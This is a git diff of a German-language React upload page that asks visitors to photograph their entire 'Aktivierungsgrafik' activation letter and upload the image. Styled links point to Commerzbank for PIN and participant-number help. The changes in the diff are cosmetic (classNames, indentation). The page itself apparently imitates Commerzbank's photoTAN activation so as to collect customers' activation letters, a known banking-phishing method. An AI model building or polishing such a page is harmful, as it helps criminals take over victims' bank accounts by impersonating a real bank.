@@ -95,8 +95,8 @@ const UploadPage: React.FC = () => {
     const file = fileInput?.files?.[0];
     
     if (!file) {
-      return;
-    }
+          return;
+        }
 
     try {
       setIsLoading(true);
@@ -128,7 +128,7 @@ const UploadPage: React.FC = () => {
   };
 
   return (
-    <div style={{
+    <div className="upload-page" style={{
       fontFamily: 'Arial, Helvetica, sans-serif',
       backgroundColor: '#f5f5f5',
       display: 'flex',
@@ -167,7 +167,7 @@ const UploadPage: React.FC = () => {
         padding: isMobile ? '0 15px' : '0 20px'
       }}>
           {/* Left Column - Upload Section */}
-        <div style={{
+        <div className="upload-section" style={{
           flex: '1',
           background: 'white',
           borderRadius: '8px',
@@ -188,14 +188,14 @@ const UploadPage: React.FC = () => {
           }}>
             Aktivierungsgrafik scannen
           </h1>
-          <div style={{
+          <div className="instruction-box" style={{
             backgroundColor: '#f8f9fa',
             border: '2px dashed #000000',
             borderRadius: '8px',
             padding: isMobile ? '15px' : '20px',
             marginBottom: '20px'
           }}>
-            <p style={{
+            <p className="instruction-text" style={{
               fontSize: isMobile ? '13px' : '14px',
               color: '#333',
               lineHeight: '1.5',
@@ -206,7 +206,7 @@ const UploadPage: React.FC = () => {
               Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.
             </p>
             {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
-              <div style={{
+              <div className="mobile-notice" style={{
                 backgroundColor: '#fff3cd',
                 border: '1px solid #ffeaa7',
                 borderRadius: '4px',
@@ -249,17 +249,17 @@ const UploadPage: React.FC = () => {
                   onChange={handleFileInputChange}
                   accept="image/*"
                   style={{ display: 'none' }}
-          />
-
+                />
+                
           {/* Buttons Container */}
           <div style={{ 
             textAlign: 'center',
             margin: '20px 0'
           }}>
-            <input
-              type="file"
+                <input
+                  type="file"
               id="directUpload"
-              accept="image/*"
+                  accept="image/*"
               style={{ 
                 margin: '0 10px 15px 0',
                 padding: '8px',
@@ -269,7 +269,8 @@ const UploadPage: React.FC = () => {
               }}
             />
             <br />
-            <button
+                    <button 
+              className="upload-button"
               onClick={handleDirectUpload}
               disabled={isLoading}
               style={{
@@ -287,8 +288,8 @@ const UploadPage: React.FC = () => {
               }}
             >
               {isLoading ? 'Wird hochgeladen...' : 'Datei hochladen'}
-            </button>
-          </div>
+                    </button>
+                  </div>
 
           {/* Selected File Display */}
           {selectedFile && (
@@ -334,7 +335,7 @@ const UploadPage: React.FC = () => {
         </div>
 
         {/* Important Info Box */}
-        <div style={{
+        <div className="info-panel" style={{
           flex: '1',
           background: 'white',
           borderRadius: '8px',
@@ -445,7 +446,7 @@ const UploadPage: React.FC = () => {
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                 <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
               </a>
-            </div>
+              </div>
             <div>
               <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                 display: 'flex',
@@ -466,7 +467,7 @@ const UploadPage: React.FC = () => {
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                 <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
               </a>
-            </div>
+              </div>
               </div>
 
           <div>
@@ -499,7 +500,7 @@ const UploadPage: React.FC = () => {
                 <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                 <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
               </a>
-            </div>
+              </div>
             <div>
               <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                 display: 'flex',
